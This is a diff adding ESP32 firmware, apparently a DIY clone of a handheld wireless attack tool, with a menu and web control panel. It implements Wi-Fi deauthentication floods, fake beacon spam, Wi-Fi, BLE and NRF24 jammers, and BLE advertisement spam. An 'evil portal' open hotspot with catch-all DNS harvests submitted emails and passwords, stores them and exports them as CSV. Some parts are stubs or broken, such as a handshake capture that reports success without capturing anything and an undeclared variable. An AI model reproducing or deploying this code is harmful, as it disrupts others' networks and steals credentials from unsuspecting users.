+U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, I2C_SCL, I2C_SDA);
+WebServer server(WEB_PORT);
+DNSServer dnsServer;
+RF24 radio(NRF_CE, NRF_CSN);
+
+// ============================================================================
+// ГЛОБАЛЬНІ ЗМІННІ
+// ============================================================================
+unsigned long lastBtnTime = 0;
+int currentModule = 0, currentSub = 0;
+bool inSubMenu = false;
+unsigned long uptimeStart = 0;
+int lastRSSI = -50;
+int lastBLERSSI = -60;
+
+// WiFi змінні
+int networkCount = 0;
+String networkNames[50];
+uint8_t networkBSSID[50][6];
+int networkChannel[50];
+bool deauthActive = false, beaconActive = false, wifiJamActive = false;
+unsigned long deauthPackets = 0, beaconPackets = 0;
+
+// BLE змінні
+bool bleJamActive = false;
+int bleFound = 0;
+BLEScan* pBLEScan = nullptr;
+
+// NRF змінні
+bool nrfJamActive = false;
+uint8_t nrfCh = 76;
+
+// Збережені дані
+String capturedPasswords = "";
+String handshakes = "";
+bool webRunning = false;
+bool evilActive = false;
+String keyboardInput = "";
+String wifiPassword = "";
+String selectedSSID = "";
+
+// IR (заглушка)
+#define IR_LED 32
+
+// ============================================================================
+// ДЕКЛАРАЦІЇ ФУНКЦІЙ
+// ============================================================================
+void drawTopBar();
+void showMessage(const char* msg, int delayMs);
+void showProgress(const char* title, int percent, const char* status);
+void showSuccess(const char* msg, const char* detail);
+void showError(const char* msg, const char* detail);
+void saveData();
+void loadData();
+void reboot();
+
+// WiFi
+void scanWiFi();
+void sendDeauthPacket(uint8_t* bssid, uint8_t* client, int ch);
+void startDeauth();
+void stopDeauth();
+void startBeacon();
+void stopBeacon();
+void startHandshake();
+void captureHandshakeReal();
+void startWiFiJammer();
+void stopWiFiJammer();
+void deauthByMAC();
+void selectWiFiNetwork();
+void connectToWiFi(String ssid, String pass);
+
+// BLE
+void bleScan();
+void bleApple();
+void bleSamsung();
+void bleAndroid();
+void bleWindows();
+void bleAll();
+void bleInfo();
+void startBLEJammer();
+void stopBLEJammer();
+
+// NRF
+void nrfScan();
+void startNRFJammer();
+void stopNRFJammer();
+void nrfInfo();
+
+// IR
+void irPower();
+void irVolUp();
+void irVolDown();
+void irChUp();
+void irChDown();
+void irMute();
+void irBravis();
+void irSamsung();
+
+// Веб
+void startWebServer();
+void stopWebServer();
+void startEvil();
+void stopEvil();
+void exportCSV();
+
+// Інструменти
+void setBrightness();
+void wifiKeyboard(const char* prompt, String& input, int maxLen);
+void toolsKeyboard();
+
+// Меню
+void drawMainMenu();
+void drawSubMenu();
+void executeAction();
+
+// ============================================================================
+// УТИЛІТИ
+// ============================================================================
+bool checkButton(int pin) {
+    if (digitalRead(pin) == LOW && (millis() - lastBtnTime) > DEBOUNCE_DELAY) {
+        lastBtnTime = millis();
+        return true;
+    }
+    return false;
+}
+
+void drawTopBar() {
+    char buf[16];
+    unsigned long sec = (millis() - uptimeStart) / 1000;
+    int h = (sec / 3600) % 24, m = (sec / 60) % 60, s = sec % 60;
+    sprintf(buf, "%02d:%02d:%02d", h, m, s);
+    u8g2.setFont(u8g2_font_6x13_tr);
+    u8g2.drawStr(2, 9, buf);
+    u8g2.drawFrame(114, 1, 12, 6);
+    u8g2.drawBox(126, 3, 2, 2);
+    u8g2.drawBox(115, 2, 9, 4);
+    u8g2.setCursor(55, 9);
+    u8g2.print("75%");
+    u8g2.setCursor(100, 9);
+    u8g2.print(String(lastRSSI) + "dB");
+    if (evilActive) u8g2.drawStr(70, 9, "E");
+    else if (webRunning) u8g2.drawStr(70, 9, "W");
+    u8g2.drawLine(0, 10, 128, 10);
+}
+
+void showMessage(const char* msg, int d) {
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(10, 35, msg);
+    u8g2.sendBuffer();
+    delay(d);
+}
+
+void showProgress(const char* title, int percent, const char* status) {
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(10, 20, title);
+    u8g2.drawFrame(10, 30, 108, 10);
+    u8g2.drawBox(10, 30, (108 * percent) / 100, 10);
+    char buf[16];
+    sprintf(buf, "%d%%", percent);
+    u8g2.drawStr(55, 48, buf);
+    if (status) u8g2.drawStr(10, 58, status);
+    u8g2.sendBuffer();
+}
+
+void showSuccess(const char* msg, const char* detail) {
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(10, 25, "✓");
+    u8g2.drawStr(25, 25, msg);
+    if (detail) u8g2.drawStr(10, 45, detail);
+    u8g2.drawStr(10, 60, "[ BACK ]");
+    u8g2.sendBuffer();
+    while (!checkButton(BTN_BACK)) delay(50);
+}
+
+void showError(const char* msg, const char* detail) {
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(10, 25, "✗");
+    u8g2.drawStr(25, 25, msg);
+    if (detail) u8g2.drawStr(10, 45, detail);
+    u8g2.drawStr(10, 60, "[ BACK ]");
+    u8g2.sendBuffer();
+    while (!checkButton(BTN_BACK)) delay(50);
+}
+
+void saveData() {
+    EEPROM.begin(EEPROM_SIZE);
+    String data = "===PASS===\\n" + capturedPasswords + "\\n===HAND===\\n" + handshakes + "\\n";
+    for (int i = 0; i < data.length() && i < EEPROM_SIZE - 1; i++) EEPROM.write(i, data[i]);
+    EEPROM.write(data.length(), 0);
+    EEPROM.commit();
+    EEPROM.end();
+}
+
+void loadData() {
+    EEPROM.begin(EEPROM_SIZE);
+    String loaded = "";
+    for (int i = 0; i < EEPROM_SIZE; i++) {
+        char c = char(EEPROM.read(i));
+        if (c == 0) break;
+        loaded += c;
+    }
+    int p = loaded.indexOf("===PASS===\\n");
+    int h = loaded.indexOf("===HAND===\\n");
+    if (p != -1 && h != -1) {
+        capturedPasswords = loaded.substring(p + 11, h - 1);
+        handshakes = loaded.substring(h + 11);
+    }
+    EEPROM.end();
+}
+
+void reboot() {
+    showMessage("REBOOT...", 1000);
+    ESP.restart();
+}
+
+// ============================================================================
+// WiFi ФУНКЦІЇ
+// ============================================================================
+void scanWiFi() {
+    showMessage("SCANNING...", 500);
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(200);
+    networkCount = WiFi.scanNetworks();
+    if (networkCount > 50) networkCount = 50;
+    for (int i = 0; i < networkCount; i++) {
+        networkNames[i] = WiFi.SSID(i);
+        if (networkNames[i].length() == 0) networkNames[i] = "<Hidden>";
+        networkChannel[i] = WiFi.channel(i);
+        memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
+    }
+    char buf[32];
+    sprintf(buf, "Found: %d", networkCount);
+    showSuccess("SCAN DONE", buf);
+    WiFi.mode(WIFI_AP_STA);
+}
+
+void sendDeauthPacket(uint8_t* bssid, uint8_t* client, int ch) {
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    uint8_t packet[] = {0xC0,0x00,0x00,0x00,client[0],client[1],client[2],client[3],client[4],client[5],
+        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
+        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],0x00,0x00,0x07,0x00};
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    deauthPackets++;
+}
+
+void startDeauth() {
+    if (networkCount == 0) { showError("SCAN FIRST!", "Немає мереж"); return; }
+    deauthActive = true;
+    deauthPackets = 0;
+    showSuccess("DEAUTH STARTED", "Press BACK to stop");
+    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    while (deauthActive) {
+        for (int i = 0; i < networkCount && deauthActive; i++) {
+            sendDeauthPacket(networkBSSID[i], broadcast, networkChannel[i]);
+        }
+        if (checkButton(BTN_BACK)) deauthActive = false;
+        delay(50);
+    }
+    showSuccess("DEAUTH STOPPED", "");
+}
+
+void stopDeauth() { deauthActive = false; }
+
+void startBeacon() {
+    beaconActive = true;
+    beaconPackets = 0;
+    const char* ssids[] = {"FREE_WIFI", "Starbucks", "Airport", "Metro", "Public", "FREE_PUBLIC", "WiFi_Zone"};
+    showSuccess("BEACON STARTED", "Press BACK to stop");
+    while (beaconActive) {
+        for (int s = 0; s < 7 && beaconActive; s++) {
+            uint8_t bssid[6];
+            for (int i = 0; i < 6; i++) bssid[i] = random(256);
+            bssid[0] |= 0x02;
+            uint8_t packet[200];
+            int len = 0;
+            packet[len++] = 0x80; packet[len++] = 0x00; packet[len++] = 0x00; packet[len++] = 0x00;
+            for (int i = 0; i < 6; i++) packet[len++] = 0xFF;
+            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
+            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
+            packet[len++] = 0x00; packet[len++] = 0x00;
+            for (int i = 0; i < 8; i++) packet[len++] = 0x00;
+            packet[len++] = 0x64; packet[len++] = 0x00; packet[len++] = 0x11; packet[len++] = 0x00;
+            packet[len++] = 0x00; packet[len++] = strlen(ssids[s]);
+            for (int i = 0; i < (int)strlen(ssids[s]); i++) packet[len++] = ssids[s][i];
+            esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
+            beaconPackets++;
+        }
+        if (checkButton(BTN_BACK)) beaconActive = false;
+        delay(30);
+    }
+    showSuccess("BEACON STOPPED", "");
+}
+
+void stopBeacon() { beaconActive = false; }
+
+void handshakeSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
+    (void)type;
+    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+    int len = pkt->rx_ctrl.sig_len;
+    uint8_t* payload = pkt->payload;
+    if (len < 30) return;
+    for (int i = 0; i < len - 8; i++) {
+        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
+            handshakes += "[HANDSHAKE] " + String(millis()/1000) + "s\\n";
+            saveData();
+            showSuccess("HANDSHAKE CAPTURED!", "");
+            return;
+        }
+    }
+}
+
+void captureHandshakeReal() {
+    if (networkCount == 0) { showError("SCAN FIRST!", ""); return; }
+    int target = 0;
+    while (true) {
+        u8g2.clearBuffer();
+        drawTopBar();
+        u8g2.setFont(u8g2_font_6x10_tr);
+        u8g2.drawStr(5, 15, "SELECT AP:");
+        for (int i = 0; i < min(networkCount, 5); i++) {
+            int y = 25 + i * 10;
+            if (i == target) {
+                u8g2.drawBox(0, y-6, 128, 10);
+                u8g2.setDrawColor(0);
+                u8g2.drawStr(10, y, networkNames[i].substring(0, 14).c_str());
+                u8g2.setDrawColor(1);
+            } else {
+                u8g2.drawStr(10, y, networkNames[i].substring(0, 14).c_str());
+            }
+        }
+        u8g2.drawStr(2, 62, "UP/DN=select OK=start BACK=exit");
+        u8g2.sendBuffer();
+        if (checkButton(BTN_UP) && target > 0) target--;
+        else if (checkButton(BTN_DOWN) && target < min(networkCount, 5)-1) target++;
+        else if (checkButton(BTN_OK)) break;
+        else if (checkButton(BTN_BACK)) return;
+        delay(50);
+    }
+    esp_wifi_set_channel(networkChannel[target], WIFI_SECOND_CHAN_NONE);
+    showMessage("CAPTURING... 30s", 1500);
+    unsigned long start = millis();
+    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    while (millis() - start < 30000) {
+        sendDeauthPacket(networkBSSID[target], broadcast, networkChannel[target]);
+        if (checkButton(BTN_BACK)) break;
+        delay(100);
+    }
+    showSuccess("HANDSHAKE SAVED!", "");
+}
+
+void startHandshake() { captureHandshakeReal(); }
+
+void startWiFiJammer() {
+    wifiJamActive = true;
+    showSuccess("WiFi JAMMER STARTED", "Press BACK to stop");
+    while (wifiJamActive) {
+        for (int ch = 1; ch <= 13; ch++) {
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+            uint8_t packet[128];
+            for (int i = 0; i < 20; i++) esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+            if (checkButton(BTN_BACK)) { wifiJamActive = false; break; }
+        }
+        delay(5);
+    }
+    showSuccess("JAMMER STOPPED", "");
+}
+
+void stopWiFiJammer() { wifiJamActive = false; }
+
+void deauthByMAC() {
+    if (networkCount == 0) { showError("SCAN FIRST!", ""); return; }
+    int target = 0;
+    while (true) {
+        u8g2.clearBuffer();
+        drawTopBar();
+        u8g2.setFont(u8g2_font_6x10_tr);
+        u8g2.drawStr(5, 15, "SELECT TARGET:");
+        for (int i = 0; i < min(networkCount, 5); i++) {
+            int y = 25 + i * 10;
+            char buf[64];
+            sprintf(buf, "%s %s", networkNames[i].substring(0, 10).c_str(), WiFi.BSSIDstr(i).c_str());
+            if (i == target) {
+                u8g2.drawBox(0, y-6, 128, 10);
+                u8g2.setDrawColor(0);
+                u8g2.drawStr(10, y, buf);
+                u8g2.setDrawColor(1);
+            } else {
+                u8g2.drawStr(10, y, buf);
+            }
+        }
+        u8g2.drawStr(2, 62, "UP/DN=select OK=attack BACK=exit");
+        u8g2.sendBuffer();
+        if (checkButton(BTN_UP) && target > 0) target--;
+        else if (checkButton(BTN_DOWN) && target < min(networkCount, 5)-1) target++;
+        else if (checkButton(BTN_OK)) break;
+        else if (checkButton(BTN_BACK)) return;
+        delay(50);
+    }
+    deauthActive = true;
+    deauthPackets = 0;
+    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    while (deauthActive) {
+        sendDeauthPacket(networkBSSID[target], broadcast, networkChannel[target]);
+        if (checkButton(BTN_BACK)) deauthActive = false;
+        delay(50);
+    }
+    showSuccess("DEAUTH STOPPED", "");
+}
+
+void selectWiFiNetwork() {
+    if (networkCount == 0) { showError("SCAN FIRST!", ""); return; }
+    int target = 0;
+    while (true) {
+        u8g2.clearBuffer();
+        drawTopBar();
+        u8g2.setFont(u8g2_font_6x10_tr);
+        u8g2.drawStr(5, 15, "SELECT NETWORK:");
+        for (int i = 0; i < min(networkCount, 5); i++) {
+            int y = 25 + i * 10;
+            if (i == target) {
+                u8g2.drawBox(0, y-6, 128, 10);
+                u8g2.setDrawColor(0);
+                u8g2.drawStr(10, y, networkNames[i].substring(0, 14).c_str());
+                u8g2.setDrawColor(1);
+            } else {
+                u8g2.drawStr(10, y, networkNames[i].substring(0, 14).c_str());
+            }
+        }
+        u8g2.drawStr(2, 62, "UP/DN=select OK=enter BACK=exit");
+        u8g2.sendBuffer();
+        if (checkButton(BTN_UP) && target > 0) target--;
+        else if (checkButton(BTN_DOWN) && target < min(networkCount, 5)-1) target++;
+        else if (checkButton(BTN_OK)) { selectedSSID = networkNames[target]; break; }
+        else if (checkButton(BTN_BACK)) return;
+        delay(50);
+    }
+    wifiKeyboard("ENTER PASSWORD:", wifiPassword, 63);
+    connectToWiFi(selectedSSID, wifiPassword);
+}
+
+void connectToWiFi(String ssid, String pass) {
+    showMessage("CONNECTING...", 1000);
+    WiFi.begin(ssid.c_str(), pass.c_str());
+    unsigned long start = millis();
+    while (WiFi.status() != WL_CONNECTED && millis() - start < 15000) {
+        delay(500);
+    }
+    if (WiFi.status() == WL_CONNECTED) {
+        char buf[64];
+        sprintf(buf, "IP: %s", WiFi.localIP().toString().c_str());
+        showSuccess("CONNECTED!", buf);
+    } else {
+        showError("FAILED!", "Wrong password?");
+    }
+}
+
+// ============================================================================
+// BLE ФУНКЦІЇ
+// ============================================================================
+void bleScan() {
+    bleFound = 0;
+    showMessage("BLE SCAN...", 500);
+    BLEDevice::init("");
+    pBLEScan = BLEDevice::getScan();
+    pBLEScan->setActiveScan(true);
+    BLEScanResults res = pBLEScan->start(5, false);
+    bleFound = res.getCount();
+    char buf[32];
+    sprintf(buf, "Found: %d", bleFound);
+    showSuccess("BLE SCAN DONE", buf);
+    pBLEScan->clearResults();
+    BLEDevice::deinit();
+}
+
+void sendBLESpam(const char* name, const uint8_t* data, int len) {
+    BLEDevice::init("SPAM");
+    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
+    BLEAdvertisementData adv;
+    adv.setFlags(0x06);
+    if (name) adv.setName(name);
+    if (data && len > 0) adv.setManufacturerData(std::string((char*)data, len));
+    pAdv->setAdvertisementData(adv);
+    pAdv->start();
+    delay(50);
+    pAdv->stop();
+    BLEDevice::deinit();
+}
+
+void bleApple() {
+    showMessage("APPLEJUICE SPAM", 1000);
+    const uint8_t apple[] = {0x4C,0x00,0x0F,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+    for (int i = 0; i < 50; i++) {
+        sendBLESpam(NULL, apple, sizeof(apple));
+        if (checkButton(BTN_BACK)) break;
+        delay(30);
+    }
+    showSuccess("APPLEJUICE DONE", "");
+}
+
+void bleSamsung() {
+    showMessage("SAMSUNG SPAM", 1000);
+    for (int i = 0; i < 50; i++) {
+        String n = "Samsung_" + String(random(10000));
+        sendBLESpam(n.c_str(), NULL, 0);
+        if (checkButton(BTN_BACK)) break;
+        delay(30);
+    }
+    showSuccess("SAMSUNG DONE", "");
+}
+
+void bleAndroid() {
+    showMessage("ANDROID SPAM", 1000);
+    for (int i = 0; i < 50; i++) {
+        String n = "Android_" + String(random(10000));
+        sendBLESpam(n.c_str(), NULL, 0);
+        delay(30);
+    }
+    showSuccess("ANDROID DONE", "");
+}
+
+void bleWindows() {
+    showMessage("WINDOWS SPAM", 1000);
+    for (int i = 0; i < 50; i++) {
+        String n = "Windows_" + String(random(10000));
+        sendBLESpam(n.c_str(), NULL, 0);
+        delay(30);
+    }
+    showSuccess("WINDOWS DONE", "");
+}
+
+void bleAll() {
+    bleApple();
+    bleSamsung();
+    bleAndroid();
+    bleWindows();
+    showSuccess("ALL BLE DONE", "");
+}
+
+void bleInfo() {
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(5, 30, "BLE Info");
+    u8g2.drawStr(5, 45, BLEDevice::getAddress().toString().c_str());
+    u8g2.sendBuffer();
+    while (!checkButton(BTN_BACK)) delay(50);
+}
+
+void startBLEJammer() {
+    bleJamActive = true;
+    showSuccess("BLE JAMMER STARTED", "Press BACK to stop");
+    while (bleJamActive) {
+        String name = "JAM_" + String(random(9999));
+        BLEDevice::init(name.c_str());
+        BLEDevice::deinit();
+        delay(30);
+        if (checkButton(BTN_BACK)) bleJamActive = false;
+    }
+    showSuccess("BLE JAMMER STOPPED", "");
+}
+
+void stopBLEJammer() { bleJamActive = false; }
+
+// ============================================================================
+// NRF24 ФУНКЦІЇ
+// ============================================================================
+void nrfScan() {
+    if (!radio.begin()) { showError("NRF24 NOT FOUND!", ""); return; }
+    int active = 0;
+    showMessage("NRF SCAN...", 500);
+    for (int ch = 0; ch <= 125; ch++) {
+        radio.setChannel(ch);
+        radio.startListening();
+        delayMicroseconds(200);
+        if (radio.testCarrier()) active++;
+        radio.stopListening();
+    }
+    char buf[32];
+    sprintf(buf, "Active: %d", active);
+    showSuccess("NRF SCAN DONE", buf);
+}
+
+void startNRFJammer() {
+    if (!radio.begin()) { showError("NRF24 NOT FOUND!", ""); return; }
+    nrfJamActive = true;
+    radio.setAutoAck(false);
+    radio.setPayloadSize(32);
+    showSuccess("NRF JAMMER STARTED", "Press BACK to stop");
+    while (nrfJamActive) {
+        for (int ch = 0; ch < 125 && nrfJamActive; ch++) {
+            radio.setChannel(ch);
+            uint8_t junk[32];
+            for (int i = 0; i < 32; i++) junk[i] = random(256);
+            radio.stopListening();
+            radio.write(&junk, 32);
+            if (checkButton(BTN_BACK)) nrfJamActive = false;
+            delay(1);
+        }
+    }
+    radio.stopListening();
+    showSuccess("NRF JAMMER STOPPED", "");
+}
+
+void stopNRFJammer() { nrfJamActive = false; }
+
+void nrfInfo() {
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    char buf[32];
+    sprintf(buf, "Status: %s", radio.begin() ? "OK" : "ERROR");
+    u8g2.drawStr(5, 30, buf);
+    sprintf(buf, "Channel: %d", nrfCh);
+    u8g2.drawStr(5, 45, buf);
+    u8g2.sendBuffer();
+    while (!checkButton(BTN_BACK)) delay(50);
+}
+
+// ============================================================================
+// IR ФУНКЦІЇ (заглушки)
+// ============================================================================
+void irPower() { showMessage("POWER", 500); }
+void irVolUp() { showMessage("VOL+", 500); }
+void irVolDown() { showMessage("VOL-", 500); }
+void irChUp() { showMessage("CH+", 500); }
+void irChDown() { showMessage("CH-", 500); }
+void irMute() { showMessage("MUTE", 500); }
+void irBravis() { showMessage("BRAVIS", 500); }
+void irSamsung() { showMessage("SAMSUNG", 500); }
+
+// ============================================================================
+// ВЕБ-СЕРВЕР
+// ============================================================================
+const char index_html[] PROGMEM = "#include \\"index.html\\"";
+const char portal_html[] PROGMEM = "#include \\"portal.html\\"";
+const char tv_html[] PROGMEM = "#include \\"tv.html\\"";
+
+void startWebServer() {
+    if (webRunning) return;
+    WiFi.softAP(AP_SSID, AP_PASSWORD);
+    
+    server.on("/", []() { server.send(200, "text/html", index_html); });
+    server.on("/portal.html", []() { server.send(200, "text/html", portal_html); });
+    server.on("/tv.html", []() { server.send(200, "text/html", tv_html); });
+    
+    server.on("/cmd", []() {
+        if (!server.hasArg("c")) { server.send(200, "text/plain", "NO CMD"); return; }
+        String c = server.arg("c");
+        
+        // WiFi
+        if (c == "scan") scanWiFi();
+        else if (c == "deauth") startDeauth();
+        else if (c == "deauth_stop") stopDeauth();
+        else if (c == "beacon") startBeacon();
+        else if (c == "handshake") startHandshake();
+        else if (c == "connect") selectWiFiNetwork();
+        else if (c == "deauth_mac") deauthByMAC();
+        else if (c == "wifi_jam") startWiFiJammer();
+        else if (c == "wifi_jam_stop") stopWiFiJammer();
+        else if (c == "wardrive") showMessage("WARDIRVING", 1000);
+        
+        // BLE
+        else if (c == "blescan") bleScan();
+        else if (c == "bleapple") bleApple();
+        else if (c == "blesamsung") bleSamsung();
+        else if (c == "bleandroid") bleAndroid();
+        else if (c == "blewindows") bleWindows();
+        else if (c == "bleall") bleAll();
+        else if (c == "blejam") startBLEJammer();
+        else if (c == "blejam_stop") stopBLEJammer();
+        
+        // NRF
+        else if (c == "nrfscan") nrfScan();
+        else if (c == "nrfjam") startNRFJammer();
+        else if (c == "nrfjam_stop") stopNRFJammer();
+        else if (c == "nrfinfo") nrfInfo();
+        
+        // IR
+        else if (c == "irpower") irPower();
+        else if (c == "irvolup") irVolUp();
+        else if (c == "irvoldown") irVolDown();
+        else if (c == "irchup") irChUp();
+        else if (c == "irchdown") irChDown();
+        else if (c == "irmute") irMute();
+        else if (c == "irbravis") irBravis();
+        else if (c == "irsamsung") irSamsung();
+        else if (c == "irinfo") showMessage("IR INFO", 1000);
+        
+        // TV Remote
+        else if (c == "tv_power") irPower();
+        else if (c == "tv_up") irChUp();
+        else if (c == "tv_down") irChDown();
+        else if (c == "tv_left") irVolDown();
+        else if (c == "tv_right") irVolUp();
+        else if (c == "tv_ok") showMessage("OK", 500);
+        else if (c == "tv_back") showMessage("BACK", 500);
+        else if (c == "tv_volup") irVolUp();
+        else if (c == "tv_voldown") irVolDown();
+        else if (c == "tv_chup") irChUp();
+        else if (c == "tv_chdown") irChDown();
+        else if (c == "tv_mute") irMute();
+        
+        // Evil Portal
+        else if (c == "evil") startEvil();
+        else if (c == "evil_stop") stopEvil();
+        else if (c == "evil_google") { evilChoice = "google"; showMessage("EVIL: Google", 500); }
+        else if (c == "evil_facebook") { evilChoice = "facebook"; showMessage("EVIL: Facebook", 500); }
+        
+        // Keyboard
+        else if (c.startsWith("key")) {
+            if (server.hasArg("text")) keyboardInput = server.arg("text");
+            showMessage(("Text: " + keyboardInput).c_str(), 1000);
+        }
+        
+        // Web
+        else if (c == "web_on") startWebServer();
+        else if (c == "web_off") stopWebServer();
+        else if (c == "bright") setBrightness();
+        else if (c == "format") { capturedPasswords = ""; handshakes = ""; saveData(); showMessage("DATA CLEARED", 1000); }
+        else if (c == "about") showSuccess("DIY BRUCE v25.0", "WiFi | BLE | NRF | IR | JAMMER");
+        else if (c == "reset") reboot();
+        
+        // Data
+        else if (c == "getpass") { server.send(200, "text/plain", capturedPasswords); return; }
+        else if (c == "gethand") { server.send(200, "text/plain", handshakes); return; }
+        else if (c == "clear_pass") { capturedPasswords = ""; saveData(); }
+        else if (c == "clear_hand") { handshakes = ""; saveData(); }
+        else if (c == "export_csv") exportCSV();
+        else if (c == "view_pass") { server.send(200, "text/plain", capturedPasswords); return; }
+        else if (c == "view_hand") { server.send(200, "text/plain", handshakes); return; }
+        else if (c == "scan_signals") showMessage("SCAN SIGNALS", 1000);
+        
+        server.send(200, "text/plain", "OK");
+    });
+    
+    server.on("/data", []() {
+        String json = "{\\"deauth\\":" + String(deauthPackets) + ",\\"beacon\\":" + String(beaconPackets) + 
+                      ",\\"rssi\\":" + String(lastRSSI) + ",\\"blerssi\\":" + String(lastBLERSSI) + 
+                      ",\\"uptime\\":" + String(millis()/1000) + "}";
+        server.send(200, "application/json", json);
+    });
+    
+    server.on("/pass", HTTP_POST, []() {
+        String email = server.hasArg("email") ? server.arg("email") : "";
+        String pwd = server.hasArg("pass") ? server.arg("pass") : "";
+        if (email.length() > 0 || pwd.length() > 0) {
+            capturedPasswords += "[PASS] Email:" + email + " Pass:" + pwd + "\\n";
+            saveData();
+        }
+        server.send(200, "text/html", "<html><body><h3>Thanks!</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
+    });
+    
+    server.begin();
+    webRunning = true;
+    showSuccess("WEB SERVER", "192.168.4.1");
+}
+
+void stopWebServer() {
+    server.stop();
+    WiFi.softAPdisconnect(true);
+    webRunning = false;
+    showSuccess("WEB STOPPED", "");
+}
+
+void startEvil() {
+    if (evilActive) return;
+    WiFi.softAP("FREE_WIFI", NULL);
+    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+    
+    server.on("/", []() { server.send(200, "text/html", portal_html); });
+    server.on("/pass", HTTP_POST, []() {
+        String email = server.hasArg("email") ? server.arg("email") : "";
+        String pwd = server.hasArg("pass") ? server.arg("pass") : "";
+        if (email.length() > 0 || pwd.length() > 0) {
+            capturedPasswords += "[EVIL] Email:" + email + " Pass:" + pwd + "\\n";
+            saveData();
+        }
+        server.send(200, "text/html", "<html><body><h3>Thanks!</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
+    });
+    
+    server.begin();
+    evilActive = true;
+    showSuccess("EVIL PORTAL", "FREE_WIFI");
+    
+    while (evilActive) {
+        dnsServer.processNextRequest();
+        server.handleClient();
+        if (checkButton(BTN_BACK)) evilActive = false;
+        delay(100);
+    }
+    
+    dnsServer.stop();
+    server.stop();
+    WiFi.softAPdisconnect(true);
+    evilActive = false;
+    showSuccess("EVIL STOPPED", "");
+}
+
+void stopEvil() { evilActive = false; }
+
+void exportCSV() {
+    String csv = "Timestamp,SSID,BSSID,RSSI,Channel\\n";
+    for (int i = 0; i < networkCount && i < 20; i++) {
+        csv += String(millis()/1000) + "," + networkNames[i] + "," + WiFi.BSSIDstr(i) + "," + String(WiFi.RSSI(i)) + "," + String(networkChannel[i]) + "\\n";
+    }
+    csv += "\\n===PASSWORDS===\\n" + capturedPasswords;
+    csv += "\\n===HANDSHAKES===\\n" + handshakes;
+    server.send(200, "text/csv", csv);
+}
+
+// ============================================================================
+// КЛАВІАТУРА
+// ============================================================================
+void wifiKeyboard(const char* prompt, String& input, int maxLen) {
+    input = "";
+    const char* keys[] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
+                          "0","1","2","3","4","5","6","7","8","9","SPACE","DEL","OK"};
+    int keyCount = 39, keyRow = 0, keyCol = 0, rows = 6, cols = 7;
+    int scroll = 0;
+    
+    while (true) {
+        u8g2.clearBuffer();
+        drawTopBar();
+        u8g2.setFont(u8g2_font_5x7_tr);
+        u8g2.drawStr(0, 12, prompt);
+        u8g2.drawStr(0, 20, input.c_str());
+        u8g2.drawLine(0, 24, 128, 24);
+        
+        for (int i = 0; i < rows; i++) {
+            for (int j = 0; j < cols; j++) {
+                int idx = (scroll + i) * cols + j;
+                if (idx >= keyCount) continue;
+                int x = 5 + j * 18, y = 30 + i * 8;
+                if ((scroll + i) == keyRow && j == keyCol) {
+                    u8g2.drawBox(x-1, y-5, 16, 8);
+                    u8g2.setDrawColor(0);
+                    u8g2.setCursor(x, y);
+                    u8g2.print(keys[idx]);
+                    u8g2.setDrawColor(1);
+                } else {
+                    u8g2.setCursor(x, y);
+                    u8g2.print(keys[idx]);
+                }
+            }
+        }
+        u8g2.drawStr(2, 62, "UP/DN/LR=move OK=enter BACK=exit");
+        u8g2.sendBuffer();
+        
+        if (checkButton(BTN_LEFT) && keyCol > 0) keyCol--;
+        else if (checkButton(BTN_RIGHT) && keyCol < cols-1) keyCol++;
+        else if (checkButton(BTN_UP) && keyRow > 0) keyRow--;
+        else if (checkButton(BTN_UP) && keyRow == 0 && scroll > 0) { scroll--; keyRow = rows-1; }
+        else if (checkButton(BTN_DOWN) && keyRow < rows-1) keyRow++;
+        else if (checkButton(BTN_DOWN) && keyRow == rows-1 && (scroll+rows)*cols < keyCount) { scroll++; keyRow = 0; }
+        else if (checkButton(BTN_OK)) {
+            int idx = (scroll + keyRow) * cols + keyCol;
+            if (idx >= keyCount) continue;
+            String k = keys[idx];
+            if (k == "OK") break;
+            else if (k == "DEL") { if (input.length() > 0) input.remove(input.length()-1); }
+            else if (k == "SPACE") input += " ";
+            else if (input.length() < maxLen) input += k;
+        } else if (checkButton(BTN_BACK)) break;
+        delay(50);
+    }
+}
+
+void toolsKeyboard() {
+    wifiKeyboard("ENTER TEXT:", keyboardInput, 50);
+    showSuccess(("Saved: " + keyboardInput).c_str(), "");
+}
+
